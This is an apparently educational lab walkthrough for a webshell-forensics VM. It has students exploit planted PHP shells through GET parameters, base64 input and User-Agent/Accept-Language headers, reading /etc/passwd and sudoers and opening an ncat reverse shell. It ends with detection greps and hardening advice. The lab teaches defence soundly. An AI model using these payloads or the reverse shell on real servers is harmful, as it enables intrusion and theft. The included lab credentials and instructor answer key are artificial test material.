# WebShell Lab

## Download and Setup Instructions:  

[**Virtual Machine Download Link**](https://drive.google.com/file/d/1lEOqQt9vBNzpvcjZDZ3YoHCanbbbIwwW/view?usp=sharing)

---

Before starting the lab, make sure you downloaded the ZIP file
provided to you. When you do that, begin to unzip the file and place the
folder wherever appropriate. These following instructions assume you are
using a VMware Workstation Client, however most of these instructions
are easy to follow no matter what VM client you use.  
  
Go to the **File** tab in the upper left hand corner of the window, once
you have clicked it, a drop down menu will appear. From there, click on
**Open**. It should then open up a file explorer, navigate to where you
put your VM’s and do either of the following. Click on the
`Sprint2_Cyber Patriot.vmx` image and it should appear within your
client. If that does not work, click on the `Sprint 2_Cyber PatriotVM.ovf`, from there it will open up an import menu, where you can
name your VM and choose where to store it.  
  
Once you have chosen both of these click on the **Import** button, and
the VM should appear for you! Once you have the VM in front of you,
click on the **Edit Virtual Machine Settings**, here is where the
settings for the VM are. Below is an image showing what your VMs
settings should be, if needed you can always turn down how much **Hard
Disk** space the VM is taking up, as you would not need too much for
this. Once checked out you should be good to go, by clicking **Ok**, and
then click on **Power on this Virtual Machine**.

<img src="media\image10.png" style="width:4.38021in;height:4.20417in" />  
  
## User Accounts:

For this lab, we will be using this main user, while switching between
the others when needed. This lab will primarily only be using this
specific user, however if you need access to the admin account (cyber
user) it will be provided here as well. Do not give students access to
this account however, as you will only need it in case of accidents
occuring.

-   Serge - Main User
    -   User Login: `Serge`
    -   Password: `Lynx123`

-   cyber user - Administrator
    -   User Login: `CyberPatriot-Linux`
    -   Password: `patriotcyber321`

### Housekeeping before jumping into the lab:

Once logged in, make sure to run this command to make sure your systems
are up to date/your box is connected. Also, make sure to take note of
the IP your machine gives you here, you will need to use it a lot in
this lab:

```
dhclient  
ip addr

sudo apt update  
sudo apt update  
sudo apt upgrade
```

## Navigating to the webpage 

### Background Knowledge to cover before hand:

1. What is a web server? A web server is a computer that contains specific programs to run and distribute web pages as they are requested.
2. What are the common Linux web servers? Apache, Nginx, Lighttpd.
3. How do you access a web server? If you are on the same machine as the web server is hosted, you can use your local host address (`127.0.0.1`). If you are on the same network as the web server you can use the machine's IP address. If the web server is configured in a specific way, you can type in a domain name.
4. Where is the base root directory for a web server? The base directory most commonly used is `/var/www`, however this is supposed to only be a temporary location, mainly for checking files. There can be instances however where admins decide to just use that file path and not move it, which can cause issues for them as it is an easy guessable target for an attacker.
5. What is PHP and why is it used? PHP is the most widely used programming language on the web and it is used for managing dynamic content, databases or building commerce sites. We see PHP webshells only use built in PHP functions to execute commands, however this can end up posing quite the issue.

In this scenario, you are **Serge**, you were brought in to look at a
webserver that recently had an attack against it. The admins are afraid
of what damage may have been caused to the server, so you are here to
try and find out exactly what happened here. The server admin says the
only other user with privileges on this machine was the user who handles
the web server, `www-admin`. 
  
Your first task, is using a web browser, navigate to the website, in the
web browser type in either the IP address of the machine, or one of these options:  

```
127.0.0.1
http://cyberpatriot*
```

You see before a pretty basic looking webpage, and four different links
are present. For some reason, the index page was left here, how about we
go ahead and take a look at this?  

<img src="media\image14.png" style="width:5.14063in;height:3.78615in" />

Upon clicking on this, we will need to take note of a couple of things.
First, take a look at the url, it should now contain a `/index.php`
after the web address. This shows us where within the web server
directory we currently are. This is an important aspect to be aware of
as we will be needing to possibly use it later to get access to specific
files we would be unable to see.

<img src="media\image9.png" style="width:5.67188in;height:4.19028in" />

Speaking of our base web directory, we are going to be needing to find
it. Since the index page is provided to us, how about we take a look
through this? This will give us information such as system information,
server administration, and most importantly environment information. We
can tell from this that this server is running apache, but alongside
that it should list out the Document Root file for us. Once you have
found it, write it down and proceed to move on.

To get back to the servers landing page, simply press the back button on
your web browser, or you feel free to retype the url you used earlier.

Now that we are back on the main page, we can navigate to another page!
However, we did just find the document root, how about we go there and
see if we can find out anything?

Open up your terminal and use this command:

```
cd /path/to/directory  
```

Now that we are in there, how about we see what exactly is inside here?
To do this use:

```
ls
```

By doing this, we can see a lot of different php files! Many of them
which are not listed on the webpage! However, we should still be able to
access them!  
  
Back in your web browser, search for this specific page, once again feel
free to use whatever address you feel, but for this example:

```
cyberpatriot/under_construction.php  
```

By doing this, we have made it to one of the pages listed under the
directory! This is just a simple blank page though, so nothing should be
loading.

Well, we have found a lot of php pages, but nothing looks out of the
ordinary yet, did an attack really happen here? Let's navigate back to
our home page and think of our next plan of attack.

## PHP WebShells:

### Frequently Asked Questions:

1. What is `system()`? A php function that accepts the command as a parameter and executes on the system you are working on, giving you an output of the results of the command.
2. What is `exec()`? Much like `system()`, it accepts the command as a parameter and runs it, but it does not return a result, and can be used for obfuscation.
3. What is HTTP? Hypertext Transfer Protocol used to enable communication between server and client. The client and host work in a request-response relationship, such as when a browser sends a request to access a server, the server would then give the client what it asked for.
4. What is the GET method? One of the various request methods HTTP is able to use. GET is the most common HTTP method and is used to request data from a specific set of resources. Keep in mind that GET can be cached and remain in browser history. GET requests may be more common than you think, you can see them in parts of the URL since that is where the query is sent through. An example of this would be: `/name.php?name=Derek`, this would give you a response of Derek if the webpage can handle these queries.
5.  What would `$_GET['parameter']` do? It would equal the string of information sent in a GET Request, using our above example the `$_GET['name']` would be `Derek`.

### Command execution through GET and System:

Since we are on the landing page of the web server, how about we go
ahead and check out another link! This time, let's go to the Name Reader
tool. It should look something like this:

<img src="media\image7.png" style="width:4.73438in;height:3.5254in" />

This webpage, when used correctly should read whatever name we put
inside of here! It gives us instructions too, simply put after the php
in the url this:

**Query:** `?name=yourname`

**Full:** `cyberpatriot/name.php?name=Serge`

What a cool little tool! However, pages like this can be very suspicious
depending on how they are made, how about we try and take a better look
into this?

On your command line, list out or open with a text editor the entirety
of this `name.php` file:

```
nano name.php
```

Taking a better look at this file, we can see how this php file was
crafted. In order to get the name query to pass through, instead of just
using the `$_GET` variable, they assigned a `system()` before it!
Because of this, we can run linux commands now through our webshell and
get information to go through!  
  
Back on our webpage, let's try to execute a command, type in this at the
end of the url:

**Query:** `?name=ls`

**Full:** `cyberpatriot/name.php?name=ls`

By typing this in, the `ls` command should have gone through and
displayed for you the contents of the `/var/www/html` directory! This
is most likely how the attackers were able to get access to the web
server and make all of these changes, the amount of commands that can be
ran an executed though this is limitless and is quite dangerous,
attackers now have a constant way they can get into the web server
essentially.

<img src="media\image12.png" style="width:5.51563in;height:4.1102in" />

You recall that the user `www-data` has sudo access, and that it is in
charge of the web server. How about we see if this is true. Firstly, add
the command `whoami` to the query, like we just did with `ls`.
Afterwards, if it returns as `www-data` let's see if we can really get
access to crucial files, for example, try `cat /etc/passwd` to see the
password data come up and then try `sudo cat /etc/sudoers` to see the
entirety of the `sudoers` file!  
  
However, using this method is quite “loud”, if you were to take a look
at web server logs, these queries would be quite visible in the
`/var/log/apache2/access.log`, however we don’t have access to this
file. `cyberuser` showed you what the logs showed up as though:

```
127.0.0.1 - - [17/Oct/2020:15:10:09 -0400] "GET
/name.php?name=sudo%20cat%20/etc/sudoers HTTP/1.1" 200 740 "-"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101
Firefox/81.0"  
```

The logs from the initial attack are gone however, and knowing how
visible this is, the attackers must have put in more less visible ways
to get access to the server. Let's try to find one.  
  
Navigating back to our base web page (`http://cyberpatriot`), let's
visit the Base64 encoding tool. Base64 encoding is an algorithm that
makes it so you can transform any characters into an alphabet of
letters, digits, and other characters. It is used primarily to transfer
data across a network safely without interrupting other protocols, such
as if you need to send binary data across a network, you should encode
it with Base64 first in order to ensure safe travels of the data.  

This webpage is structured very similar to our name page that we did
earlier, so how about we try this out again. Let's try to use the `ls`
command:

**Query:** `?code=ls`
**Full:** `http://cyberpatriot/Base64.php?code=ls`

Nothing worked this time though, it just gave us the encoded string of
`bHM=`, going over to the file in the command line (`nano Base64.php`), we can see that this time around, it does not have the
system command, meaning this is just a safe Base64 encoder. But why
would this be here?  
  
Let's take a look at another file that we have visited quite a bit often
already, our landing page for our web server, better known as
`welcome.php`, let's open this up and see what is inside of this as
well!  

Well would you look at that! There is a hidden php shell within here!
Not only that but this is uniquely structured. First of all, this is all
done in a single line with the least amount of blank space as possible.
This is done to try to obfuscate a shell from the naked eye, to just try
to make it appear as natural as possible. Instead of using
`$_GET["name"]` here they are using `["decode"]` as well. Not
only that, but in order for your commands to work, you need to input
your command in Base64, which then gets decoded and runs as a command
through the system! The attackers must have sneakily put this within
here to try and hide commands they are running better. Now that we know
this how about we give it a try on our web browser!  
  
Navigate back to the home page (`http://cyberpatriot`) but this time,
put this at the encoded `ls` command we got earlier at the end of
it:

**Query:** `?decode=bHM=`

**Full:** `cyberpatriot/?decode=bHM=`

<img src="media\image3.png" style="width:6.5in;height:2.76389in" />

The encoded `ls` command got decoded from our input and then it was
able to be run within the web server's landing page! Not only is this
shell hidden in a very commonly used page, but it is using Base64 to
make it hard to decipher what is being used in the logs, it should show
up as this in the logs:

```
127.0.0.1 - - [17/Oct/2020:16:24:21 -0400] &quot;GET /favicon.ico HTTP/1.1&quot; 404 492 &quot;http://cyberpatriot/?decode=bHM=&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0&quot;
```

If a server administrator, or whoever is looking at the logs, does not
have a good idea at specific encoding methods and they did not catch on
that a webshell was implemented into their server, they may not exactly
know what is going on. Combine this with the obfuscation gone over
before and this makes for some very stealthy attacks!  

Next let's take a look at a file that is **NOT** off of our webpage! If
you need to make sure to `ls` the `/var/www/html` directory again if
need be, but we are going to be looking at a peculiar file `_.php`.

Not only is this a strange name for a php file, as well as not listed on
our landing page, but it has some interesting information inside. How
about we take a look at it?  

<img src="media\image4.png" style="width:6.5in;height:1.80556in" />

We have mentioned that when looking at logs, data can show when we are
inputting queries, but there are other scanning tools that can look at
php files with common functions like `system()` and would alert admins to
get rid of them or have them cease to function. However, this shell is
different, we only have GET here. What this php file is doing is it will
allow the user to define the php function as well as the system command
as two different GET parameters. The first GET queries for the function
while the second GET asks for the command to run. This is also done with
a minimal amount of characters, once again as an attempt to hide this.
If this followed other examples such as getting rid of white space,or
putting it within another php file, this would be very hard to spot.
Nevertheless we will give this one a try as well.  
  
On your web browser navigate to:

```
http://cyberpatriot/_.php
```

And once there, we are going to attempt to use this webshell. Previously
we have only had one query to work with, however this has two, so it
will look something like this:

**Query:** `?__=system&___=cat /etc/passwd`

**Full:** `http://cyberpatriot/_.php?__=system&___=cat /etc/passwd`

Once again, another successful webshell was put onto our server, it
should look something like this:

<img src="media\image5.png" style="width:6.5in;height:3.31944in" />

Also this is how the logs see the command:

```
127.0.0.1 - - [17/Oct/2020:16:44:36 -0400] "GET /_.php?__=system&___=cat%20/etc/passwd HTTP/1.1" 200 1157 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"**
```

### Commands within the php file:

So far, we have seen plenty of webshells that require an input in order
for a command to occur. However, this isn't always the case, there can be
shells that have a specific command that it will always run when it is
accessed, potentially causing a myriad of issues to occur.

Let us head back to our landing page and access the one link we have
ignored up to this point, the greeting page. When we click on this, it
takes a very long time for it to load, not only that all it contains is
a simple greeting. What could potentially be causing this? Let's head
over to the command line and see what is up. Open up `greeting.php`
and see what is inside.

<img src="media\image1.png" style="width:6.5in;height:2.25in" />

From the looks of it, the attackers put in a `shell_exec()` function!
What this does is performs a command given to it and runs it without
giving an input, so it was quietly downloading the application `nmap`
when requesting the webpage. Due to `www-admin` being a `sudo` user,
this command was able to be run just fine. However, what possible damage
can be caused by this?  
  
On our command line, run the command:

`nc -lvp 1234`
  
This will cause netcat to listen on that specific port until a
connection will try to be made. Now, let's go to the web browser and
head over to the `name.php` page. On this page we are going to be
using this command:

```
?name=ncat IPADDRESS 1234 -e /bin/sh
```

This will cause a bash shell to be made in our terminal! To think, this
was all because one page could download an application, while another
one could run commands, this must be how the attackers were able to make
all of these webshells! They could easily have run the installation
command through on the `name.php` page and did these steps in order to
get a shell! Once done, they made the rest of these webshells and made
the greeting page always download `nmap` in case it ever gets deleted!
Here is the log once more:

```
127.0.0.1 - - [17/Oct/2020:17:02:42 -0400] "GET /name.php?name=ncat%20192.168.235.147%201234%20-e%20/bin/sh HTTP/1.1" 200 379 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"**
```

### Modifying Headers:

We only have a couple of more php files to look at, let's see what else
there could possibly be. We never took a better look into
`under_construction.php`, how about we take a look into that file?

This one is quite different! Essentially only one line here, but the
difference is important. Unlike the other scripts we have seen thus far,
we are not passing the command through GET or having it run when we load
the page, instead we will have a command be able to run based off what
is in the `HTTP_USER_AGENT`. This is an option when we decide to run
an HTTP Request, which may be unfamiliar to you, but you use it quite
often, most often through the guise of the URL in a web browser.
  
The main parts of an HTTP request is its Method, Path and Version of
Protocol. We have been using GET as our main method already, path
signifies where the Method is going to fetch information from, and then
the version of the protocol is what version of HTTP is currently being
used, most often this is `HTTP/1.1`.There are also optional headers
that convey additional information for the servers, which is what is
being exploited here. The `HTTP_USER_AGENT` is often used to let
peers identify the application requesting the user agent, but with this
php shell we can manipulate it a bit.

We are going to attempt to do this manually, what I am going to do here
is list out the commands you will need to input and then I will ask to
perform them, I am doing it this way as the way the server is
configured, you do not have the most amount of time to send this
request, keep on trying though! Make sure after each line you input, you
press the enter key, and once you put in the last line, the User-Agent,
you press enter twice:

```
nc -C IP_OF_SERVER 80
GET /under_construction.php HTTP/1.1
Host: IP_OF_SERVER
User-Agent: cat /etc/passwd
```

Once accomplished, you should get something that looks like this:

<img src="media\image15.png" style="width:5.21354in;height:3.63513in" />  
  
So what did we do here? Using the `nc` command we were able to send a
custom GET Request. The `-C` flag allowed us to interactively type in
our GET request, instead of having to use other commands to signify new
lines. The IP address of the server is required to know where we are
connecting to, and the `80` at the end is the port we are using, this is
most commonly used as the port for HTTP connections. Next, we formed our
GET request, our method was GET, our path was the
`under_construction.php` page, and `HTTP/1.1` was our version. We need
the `Host` header to specify the host and port number of the server to
which the request is being sent. Lastly, we have our `User-Agent`, which
is where we can input our command, it worked!  
  
This is a stealthy option, however if we take a look at our logs

```
192.168.235.147 - - [17/Oct/2020:17:32:22 -0400] "GET /under_construction.php HTTP/1.1" 200 2642 "-" "cat /etc/passwd"**
```

You can still see the command being executed! However, there is another
way, there is a hidden shell in one of the pages we have not accessed
yet. I will give you a hint, it is not in the `Secrets` directory,
that is for later, and it was one of the first pages we visited. Let's
go find it! (Refer to Bottom of Document for Answer#1)
  
When you find it, it should look something like this:

<img src="media\image6.png" style="width:6.5in;height:1.80556in" />  
  
Taking a look into this, we can see that it is using a very similar
function as the last script, however this time it is using
`HTTP_ACCEPT_LANGUAGE`! This header is mainly used to advertise which
language the client is able to understand, but for this case we will use
it for an exploit!  
  
When you are ready, run this command following the previous instructions
we went over earlier!:

```
nc -C IP_OF_SERVER 80
GET /file_you_need_to_find.php HTTP/1.1
Host: IP_OF_SERVER
Accept-Language: cat /etc/passwd
```

The file this is hidden in has quite a large output, but when
accomplished, scroll up on your terminal and you should see something
like this:

<img src="media\image8.png" style="width:4.87487in;height:3.53646in" />  
  
Once again it worked! When we take a look at the logs too:

```
192.168.235.147 - - [17/Oct/2020:17:48:29 -0400] "GET /index.php
HTTP/1.1" 200 86714 "-" "-"**
```

It shows no command being executed at all! Making this one of the most
stealthy methods of a webshell thus far!  
  
### Hidden within Directories:
  
Our last WebShell will be covering something we have already
covered, being based off the `GET`/`system` methods we have seen previously.
However, the difficulty with this one is it is hidden! Using your web
browser, navigate to:

```
http://cyberpatriot/Secret/
```

You should find something akin to this:

<img src="media\image11.png" style="width:6.5in;height:3.36111in" />

The `Secret` directory is actually a directory full of
sub-directories! And within those sub-directories are:

<img src="media\image2.png" style="width:6.5in;height:3.33333in" />

Even more directories! Until:

<img src="media\image13.png" style="width:6.5in;height:3.38889in" />

We finally get to a php file! What you will be doing here is going
through each webpage, either using the web browser, or using the command
line by running a command like this:

```
nano /var/www/html/Secret/Door1/WindowA/File.php
```

To find the php page that has the WebShell within it! They really stuck
it somewhere deep within our directories, but it is important that we
find it, we don’t want them to get in through a very hidden method! Now
let's find it! (Refer to Bottom of Document for Answer#2)  
  
Once you found it, make sure to nano the file to ensure you know what
GET query you will be doing here, you should be able to execute any
commands here much like you did in `name.php`!
  
### Answers for hidden parts:
**INSTRUCTOR EYES ONLY:**

* Answer#1: The file they are looking for is the `index.php` file
* Answer#2: The correct path to the file is `/var/www/html/Secret/Door2/WindowB/File.php`

  
## How to prevent WebShells:

We have seen just how powerful these webshells can be, but they can be
hard to detect in actual systems. If you ever suspect there is a
webshell present, you should make sure to do a routine check of various
places within your server. The first thing you can do is make sure you
check your log file! I have showcased you what some of the logs look
like and now I will let you switch over to `cyberuser` to show it off. Go
into the file:

```
nano /var/log/apache2/access.log
```

This is quite a big file, but within here you are able to check at all
of the server access and error logs. While this works, you can also use
additional commands such as grep to find a specific keyword, like with
`cat`:

```
cat /var/log/apache2/access.log | grep "cat"
```

You can also use grep alongside, the RPN calculator to evaluate the
risks of some of these webshells, you will have to use this command in
your root web directory however:

```
grep -RPn "(|exec|eval|shell_exec|system|phpinfo|base64_decode) *\("
```

Using the find command you can see what files in a specific directory
has been adjusted within a certain amount of time, just replace the
`-1` with however long you would like to:  

```
find -name '*.php' -mtime -1 -ls
```

There are plenty of other detection methods, however what can you do to
prevent PHP shells from hurting your system? First of all, don’t be like
this and put `www-data` as a sudo user, that will only end up harming you
in the end, much like we have learned previously with privilege
escalation. I recommend using commands like `chmod` and `chown` to
give ownership to a responsible user that is not in too many groups such
as sudo, and to change permissions as to who can access specific files
or directories within your server. Another important thing is to
straight up disable PHP functions such as `system()`, `exec()` and
`shell_exec()`, if you absolutely need to make sure users who can
access this page do not have access to these scripts. Using alternative
commands like `escapeshellarg()` ensure inputs can not be injected
into shell commands. However, in general don’t put too much faith into
user inputs, it can end up hurting you in the end. Follow these methods
and you should be golden! Good luck!